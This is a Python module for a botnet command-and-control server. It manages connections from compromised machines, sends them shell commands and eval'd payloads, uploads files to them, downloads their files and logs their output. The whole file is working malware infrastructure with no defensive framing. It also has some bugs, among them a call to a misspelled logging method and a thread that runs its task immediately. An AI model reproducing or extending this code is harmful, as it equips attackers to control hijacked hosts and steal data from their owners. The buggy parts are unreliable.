import json
from threading import Thread, Condition
from threading import Lock
import select
import base64
import os

try:
    from server import formatsock, server
    from server.client import client
    from server.botfilemanager import BotNetFileManager
    from server.botpayloadmanager import BotNetPayloadManager
except:
    import formatsock
    import server
    from client import client
    from botfilemanager import BotNetFileManager
    from botpayloadmanager import BotNetPayloadManager

class BotNet(Thread):
    INPUT_TIMEOUT = 1
    PRINTOUT_JSON = 'printout'
    ERROUT_JSON = 'errout'
    STDOUT_JSON = 'stdout'
    STDERR_JSON = 'stderr'
    SPEC_JSON = 'special'
    FILESTREAM_JSON = 'filestreams'
    FILECLOSE_JSON = 'fileclose'
    LS_JSON = 'ls'
    FILESIZE_JSON = 'filesize'

    def __init__(self, socketio, payloadpath="payloads", downloadpath="media/downloads"):
        super().__init__()
        self.connlock = Lock()
        self.conncon = Condition(self.connlock)
        self.allConnections = {}
        self.logs = {}
        self.socketio = socketio
        self.filemanager = BotNetFileManager(downloadpath)
        self.payloadmanager = BotNetPayloadManager(payloadpath)
        self.downloaddir = downloadpath

    def addConnection(self, user, conn):
        with self.connlock:
            if user in self.allConnections:
                pass  # TODO: How to deal with duplicate usernames?
            self.allConnections[user] = conn
            self.logs[user] = BotLog(user)
            self.conncon.notifyAll()
            # Notify recv thread

    def removeConnection(self, user):
        # Will be making changes to allConnections
        with self.connlock:
            if user in self.allConnections:
                # Wait for any sends to go through for this bot
                # terminate and remove
                try:
                    self.allConnections[user].close()
                except:
                    pass
                # Remove object, don't delete so sends still go through
                self.allConnections.pop(user)
                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                print("[-] Lost connection to {}".format(user))

    def getConnections(self):
        with self.connlock:
            return self.allConnections.keys()

    def run(self):
        while True:
            with self.connlock:
                bots = list(self.allConnections.values())
                while len(bots) == 0:
                    self.conncon.wait()
                    bots = list(self.allConnections.values())
            # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
            # TODO maybe use pipe as interrupt instead of timeout?
            rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
            # We now have a tuple of all bots that have sent data to the botnet
            for bot in rs:
                user = bot.user
                try:
                    msg = bot.recv()
                    jsonobj = json.loads(msg.decode('UTF-8'))
                    printout = ""
                    errout = ""
                    out = ""
                    err = ""
                    special = {}
                    filestream = {}
                    fileclose = []

                    if BotNet.PRINTOUT_JSON in jsonobj:
                        printout = jsonobj[BotNet.PRINTOUT_JSON]
                    if BotNet.ERROUT_JSON in jsonobj:
                        errout = jsonobj[BotNet.ERROUT_JSON]
                    if BotNet.STDOUT_JSON in jsonobj:
                        out = jsonobj[BotNet.STDOUT_JSON].rstrip()
                    if BotNet.STDERR_JSON in jsonobj:
                        err = jsonobj[BotNet.STDERR_JSON].rstrip()
                    if BotNet.SPEC_JSON in jsonobj:
                        special = jsonobj[BotNet.SPEC_JSON]
                    if BotNet.FILESTREAM_JSON in jsonobj:
                        filestream = jsonobj[BotNet.FILESTREAM_JSON]
                    if BotNet.FILECLOSE_JSON in jsonobj:
                        fileclose = jsonobj[BotNet.FILECLOSE_JSON]

                    # Forward stdout/stderr... as needed
                    totallen = len(printout) + len(errout) + len(out) + len(err)
                    if totallen > 0:
                        log = self.logs[user]
                        log.logstdout(printout)
                        log.logstderr(errout)
                        log.logstdout(out)
                        log.logstderr(err)

                        self.socketio.emit('response',
                                           {'user': user,
                                            'printout': printout,
                                            'errout': errout,
                                            'stdout': out,
                                            'stderr': err},
                                           namespace="/bot")

                    if len(special) > 0:
                        if BotNet.LS_JSON in special:
                            self.socketio.emit('finder',
                                               {'special': special,
                                                'user': user},
                                               namespace="/bot")
                        if BotNet.FILESIZE_JSON in special:
                            fileinfo = json.loads(special[BotNet.FILESIZE_JSON])
                            self.filemanager.setFileSize(user,fileinfo['filename'],fileinfo['filesize'])

                    # Forward file bytes as needed
                    for filename in filestream.keys():
                        # Get the b64 encoded bytes from the client in string form, change to normal bytes
                        filebytes = base64.b64decode(filestream[filename])
                        self.filemanager.appendBytesToFile(user, filename, filebytes)

                    for filename in fileclose:
                        self.filemanager.closeFile(user, filename)

                except IOError:
                    # Connection was interrupted
                    self.removeConnection(user)

    def resendLog(self, user):
        with self.connlock:
            if user in self.logs:
                for entry in self.logs[user].log:
                    if entry[0] == BotLog.STDOUT:
                        self.socketio.emit('response',
                                           {'user': user,
                                            'printout': '',
                                            'errout': '',
                                            'stdout': entry[1],
                                            'stderr': ''
                                            },
                                           namespace="/bot")
                    if entry[0] == BotLog.STDERR:
                        self.socketio.emit('response',
                                           {'user': user,
                                            'printout': '',
                                            'errout': '',
                                            'stdout': '',
                                            'stderr': entry[1]
                                            },
                                           namespace="/bot")

    def sendStdin(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.logs[user].logstdin(cmd)
                self.allConnections[user].send(cmd, type="stdin")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendCmd(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.logs[user].logsdin("(cmd \""+cmd+"\")")
                self.allConnections[user].send(cmd, type="cmd")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendEval(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="eval")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendFile(self, user, filename, fileobj):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].sendFile(filename, fileobj)
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def startFileDownload(self, user, filename):
        with self.connlock:
            if user in self.allConnections:
                if not self.filemanager.fileIsDownloading(user,filename):
                    self.allConnections[user].startFileDownload(filename)
                return True
            return None

    def getPayloadNames(self):
        return self.payloadmanager.getPayloadNames()

    def getPayloads(self):
        return self.payloadmanager.getPayloads()

    def sendPayload(self, user, payload, args):
        payloadtext = self.payloadmanager.getPayloadText(payload, args)
        if payloadtext:
            self.logs[user].logstdin("(payload \""+payload+"\")")
            return self.sendEval(user, payloadtext)
        else:
            return False

    def requestLs(self, user, filename):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].requestLs(filename)

    def getFileManager(self):
        return self.filemanager

    def getDownloadFiles(self):
        return self.filemanager.getFilesAndInfo()

    def getFileName(self, user, filename):
        return self.filemanager.getFileName(user,filename)

    def deleteFile(self, user, filename):
        return self.filemanager.deleteFile(user,filename)


class Bot:
    FILE_SHARD_SIZE = 4096
    FILE_STREAM = 'fstream'
    FILE_CLOSE = 'fclose'
    FILE_FILENAME = 'fname'
    CLIENT_STREAM = 'cstream'
    CLIENT_CLOSE = 'cclose'
    FILE_DOWNLOAD = 'down'
    LS_JSON = 'ls'

    def __init__(self, sock, host_info, socketio):
        self.sock = formatsock.FormatSocket(sock)
        self.arch = host_info['arch'][:-1]
        self.user = host_info['user'][:-1]
        self.botlock = Lock()
        self.socketio = socketio

    def send(self, cmd, type="stdin"):
        json_str = json.dumps({type: cmd})
        with self.botlock:
            self.sock.send(json_str)

    def recv(self):
        return self.sock.recv()

    def close(self):
        with self.botlock:
            self.sock.close()

    def fileno(self):
        '''
        Returns the OS fileno of the underlying socket, that way the
        OS can wait for IO on the fileno and allow us to serve many bots
        simultaneously
        '''
        return self.sock.fileno()

    def sendFile(self, filename, fileobj):
        # TODO: single worker thread instead of new one?
        t = Thread(target=self.__sendFileHelper(fileobj, filename))
        t.start()

    def sendClientFile(self, fileobj):
        self.sendFile(None, fileobj)

    def __sendFileHelper(self, fileobj, filename=None):
        with self.botlock:
            dat = fileobj.read(Bot.FILE_SHARD_SIZE)
            if len(dat) > 0:
                while len(dat) > 0:
                    # Turn the bytes into b64 encoded bytes, then into string
                    bytestr = base64.b64encode(dat).decode('UTF-8')
                    if filename:
                        # Particular file
                        json_str = json.dumps({Bot.FILE_STREAM: bytestr, Bot.FILE_FILENAME: filename})
                    else:
                        # Client file
                        json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
                    self.sock.send(json_str)
                    dat = fileobj.read(Bot.FILE_SHARD_SIZE)
                if filename:
                    json_str = json.dumps({Bot.FILE_CLOSE: filename})
                else:
                    json_str = json.dumps({Bot.CLIENT_CLOSE: True})
                self.sock.send(json_str)
                fileobj.close()
                self.socketio.emit('success', {'user': self.user, 'message': "File upload successful"},
                                   namespace='/bot')

    def startFileDownload(self, filename):
        with self.botlock:
            json_str = json.dumps({Bot.FILE_DOWNLOAD: filename})
            self.sock.send(json_str)

    def requestLs(self, filename):
        with self.botlock:
            json_str = json.dumps({Bot.LS_JSON: filename})
            self.sock.send(json_str)


class BotLog:
    STDOUT = 0
    STDERR = 1
    STDIN = 2
    def __init__(self, user, maxlen=100, logdir="logs"):
        self.user = user
        self.log = []
        self.maxlen = maxlen
        if not os.path.isdir(logdir):
            os.mkdir(logdir)
        self.logpath = os.path.join(logdir,user+".log")
        self.logobj = open(self.logpath,"a")

    def logstdin(self,win):
        if len(win) > 0:
            self.log.append((BotLog.STDIN, win))
            self.logobj.write("[IN]: \t" + str(win)+("\n" if win[-1]!="\n" else ""))
            self.logobj.flush()
            if len(self.log) > self.maxlen:
                self.log.pop()

    def logstdout(self, wout):
        if len(wout) > 0:
            self.log.append((BotLog.STDOUT,wout))
            self.logobj.write("[OUT]:\t"+str(wout)+("\n" if wout[-1]!="\n" else ""))
            self.logobj.flush()
            if len(self.log)>self.maxlen:
                self.log.pop()

    def logstderr(self, wout):
        if len(wout)>0:
            self.log.append((BotLog.STDERR, wout))
            self.logobj.write("[ERR]:\t" + str(wout)+("\n" if wout[-1]!="\n" else ""))
            self.logobj.flush()
            if len(self.log) > self.maxlen:
                self.log.pop()

